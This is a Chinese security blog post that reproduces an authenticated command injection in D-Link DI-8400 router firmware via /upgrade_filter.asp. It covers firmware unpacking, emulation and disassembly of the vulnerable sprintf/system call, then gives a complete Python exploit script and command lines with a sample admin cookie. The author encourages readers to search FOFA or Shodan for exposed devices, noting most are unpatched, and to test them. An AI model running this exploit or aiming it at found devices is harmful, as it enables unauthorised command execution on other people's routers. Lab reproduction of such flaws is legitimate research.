#  D-link的漏洞复现  
搞安全的面具侠
                    搞安全的面具侠  搞安全的面具侠   2026-04-21 09:23  
  
最近忙的有点热火朝天，前阵子一直一直在感受AI工具，在使用openclaw，确实好用，但是搞安全的用它的限制还是挺多的，这不最近就发现随着龙虾的爆火，它存在的漏洞也随之爆出！国家信息安全漏洞共享平台上面最新的漏洞列表，关于openclaw的涨了好多！！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkCzWPGhiblhsoNvFQx7Ia92ribPTyGsGY71heFUWRmz2zf60BYSE671MtxUmxQqPchn0vJNMO1Bpeo54icCQP7tDdJa2hsv8D4FohJwOpdd18/640?wx_fmt=png&from=appmsg "")  
  
光今天一天就提交了好多个，另外未名漏洞的这个我建议大家多测试一下，因为这个漏洞虽然危害级别是中，但是经过身边几个朋友测试发现这个ummmm，可能是审核人不专业吧，这个危害挺高的，是  
属于一打打一大大大大大大片  
的那种，嗯，只能说这么多了！！！！  
  
但今天我想给大家说的并不是有关openclaw的漏洞，而是另外一个D-link的漏洞，在4-17时候，也陆续提交了很多有关他的漏洞，评级不低，但都是同一类的漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkCzWPGhibliatQYCVxjb44rwhQ6c2mgGRqXlC2ys2riaYBuO2SsZxo2SLLTjibeoYxrVeLf75w36iaBj24mHbpDHxcW4AWhXq1qRQyNcfDyRez4/640?wx_fmt=png&from=appmsg "")  
  
而且不知道为啥，他们的漏洞长期存在的都是那么几个，类型也就是哪几类，接下来我拿个老的洞复现一下，并不是溢出，是注入的洞，感兴趣的可以再fofa或者是shodan上面搜一些资产，找来测试一下，绝大部分都是没有修复的。  
  
1-注入命令  
  
2-dl8400产品类  
  
3-描述：  
 攻击者可通过向目标设备发送恶意构造的 HTTP POST 请求， 在无需有效认证的情况下执行任意系统命令。当请求路径为/upgrade_filter.asp  
时，该漏洞可被成功触发， 从而对设备安全造成严重威胁。  
  
4-原理拆解：  
  
（1）使用binwalk  
对固件进行解包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TkCzWPGhibljvx97rfbnuBx1ACNVFECyc5Z3yPbLI9Pj2hjlq88o04D1rXQ4lfRR1yxz6eThydKGaz1p25c1CqMfGZTf6vTVz6U1rcGSQ5icI/640?wx_fmt=png&from=appmsg "")  
  
（2）  
查看系统架构及保护  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkCzWPGhiblgCubMnqicVgT5Iyiajb5BVPjFUfWp67GvRia0yL9ToHIkIbM2nue6AQeOPGia3s6Cz6ibPialBXoGZOMTcb4ekrGXjQW6fZdP1ctSzM/640?wx_fmt=png&from=appmsg "")  
  
（3）  
使用FirmAE仿真，查看启动项  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkCzWPGhiblgm72C8E5zicbibTQDGhRLxWQnW4qv5gUV86UiaPQPQhJp2P7RfmzyNiaHicLtAH8bGNuw5OgMPILLpX1HQ1xc6PzAu2bTqGD2KCUiag/640?wx_fmt=png&from=appmsg "")  
  
（4）使用IDA分析jhttpd  
  
（5）shift+f12  
反编译为字符串，根据漏洞描述搜索upgrade_filter.asp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkCzWPGhibliall4DC6te1Aguf0akVnJlby9dvBN0P5MoM3DZ9D6I5m5IicBicwhVVlPRj34aOYLlgBN7U2VaoERuLjjJZ4Z3vkgHS7EpwVgnYc/640?wx_fmt=png&from=appmsg "")  
  
（6）  
找到upgrade_filter_asp  
函数  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/TkCzWPGhiblhY4cpaGia7ib4F0v2BuNDquu6Wfxn2S78RUMWPYibRXUgxTJwjnEdDgd1svMJM4X8TPtl3exxrrwxoqmJg5ibM3mNPNSlgB7QibbpE/640?wx_fmt=png&from=appmsg "")  
  
分析代码，存在注入点：  
  
1）sprintf(buf, "wys wget download %s", parm);  
  
2）system(buf);  
  
3）  
- parm = httpd_get_parm(a1, "path")  
：从 HTTP 请求中取出参数path  
  
- sprintf  
：把用户可控的path**直接拼接进命令行字符串**  
  
- system  
：把拼接结果交给/bin/sh -c <命令>  
 执行  
  
### 1. 验证条件  
- 攻击前置条件：登录获取cookie  
  
### 2. 验证步骤  
- **Step1**  
：使用FirmAE  
进行固件仿真  
  
命令行里敲下面代码：  
sudo ./run.sh -d dlink ../fmwares/DI_8400-16.07.26A1.trx  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkCzWPGhiblg8zURYqMhVc14J03PRyPnj5F3J2H6tnW1Q73R4T4YWkJQdGdV1oJ6WkW6UAQr38lBGQ7S7t8B2ckZ4joggibalzam7oqSXBkRA/640?wx_fmt=png&from=appmsg "")  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/TkCzWPGhiblhzc323Lkvr7zOyGS8gBYS5e7jEm9m3wdHAH74Jq60unrR2dOSkn4LZ60hqxPN1MVOdaKnpia1QA3y8j627vC9XEEiaypeJz41Ng/640?wx_fmt=png&from=appmsg "")  
- **Step2**  
：利用poc验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkCzWPGhibljOT20FBKuTEqEkc7naEnOvvoSIS1jlQ4aky8SBN9jfLSgfw8hVpv98NQ0iaEFUuD2npOVic5wicENzBIto5tNnVQS52zicBAPgpRA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TkCzWPGhibliaUogsVupLcXCViadW3ReBcY0HDDQZQicku7N02MZVW2eNAsJiaL9EoibpicGo8RnZ3YIKA9BkZloVAlX3Iq0tJqNYOP46EVdRHCzcU/640?wx_fmt=png&from=appmsg "")  
- **Step3**  
：payload  
  
# 1) 按 d4.md 默认 payload 复现（写入 /1.txt）  
  
python poc.py -t http://192.168.0.1 --cmd "ls>/1.txt" --cookie "wysLanguage=CN;userid=admin;gw_userid=admin,gw_passwd=F499CB5B7A1156B90910F2EE55A10A99"  
  
# 2) 自定义命令（示例：创建标记文件）  
  
python poc.py -t http://192.168.0.1 --cmd "echo pwned>/tmp/pwned" --cookie "..."  
  
以下代码直接附在python里面：  
  
#!/usr/bin/env python3  
  
# -*- coding: utf-8 -*-  
  
  
import argparse  
  
import sys  
  
import requests  
  
  
  
def build_payload(cmd: str) -> dict:  
  
    # 与 d4.md 一致：time + path，其中 path 走反引号命令替换  
  
    return {  
  
        "time": "acf",  
  
        "path": f"`{cmd}`",  
  
    }  
  
  
  
def main():  
  
    p = argparse.ArgumentParser(description="CVE-2024-44400 DI-8400 /upgrade_filter.asp Command Injection Payload")  
  
    p.add_argument("-t", "--target", default="http://192.168.0.1", help="Target base URL, e.g. http://192.168.0.1")  
  
    p.add_argument("--path", default="/upgrade_filter.asp", help="Vulnerable path")  
  
    p.add_argument("-c", "--cmd", default="ls>/1.txt", help="Command to execute (inside backticks)")  
  
    p.add_argument("--cookie", default="", help="Cookie header value (raw), e.g. 'wysLanguage=CN; userid=admin; ...'")  
  
    p.add_argument("--timeout", type=int, default=10, help="HTTP timeout seconds")  
  
    args = p.parse_args()  
  
  
    base = args.target.rstrip("/")  
  
    url = base + args.path  
  
  
    headers = {  
  
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0",  
  
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",  
  
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",  
  
        "Accept-Encoding": "gzip, deflate",  
  
        "Connection": "close",  
  
        "Upgrade-Insecure-Requests": "1",  
  
        "Priority": "u=0, i",  
  
        "Content-Type": "application/x-www-form-urlencoded",  
  
    }  
  
    if args.cookie:  
  
        headers["Cookie"] = args.cookie  
  
  
    data = build_payload(args.cmd)  
  
  
    try:  
  
        r = requests.post(url, headers=headers, data=data, timeout=args.timeout, allow_redirects=False)  
  
        print(f"[+] POST {url}")  
  
        print(f"[+] Status: {r.status_code}")  
  
        print("[+] Response (first 500 chars):")  
  
        print(r.text[:500])  
  
    except requests.RequestException as e:  
  
        print(f"[-] Request failed: {e}", file=sys.stderr)  
  
        return 1  
  
  
    return 0  
  
  
  
if __name__ == "__main__":  
  
    raise SystemExit(main())  
  
  
--------------------------------  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkCzWPGhiblgZd2EwjIPg7XdR88kicXe6p8QibnSHLn8IYH3Hz9zMRBQDm3uda3FGMS0oBJ7IuniacicEM7GCA6ib5b7q4RoAtkC3o2utazoHvvAU/640?wx_fmt=png&from=appmsg "")  
  
  
以上结束，可以照着这样的方式去找别的漏洞测试一下。。。。。。。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkCzWPGhibliaxSPItCFe8Ca1Ez4uFc4M2Px87PRpBA7ricZiapyAq2DKqgZdsMd9txXZppZQp3Nyv1oDj3UfcNhfq9qRpL09Yo1Cwp5nFNczkY/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
  
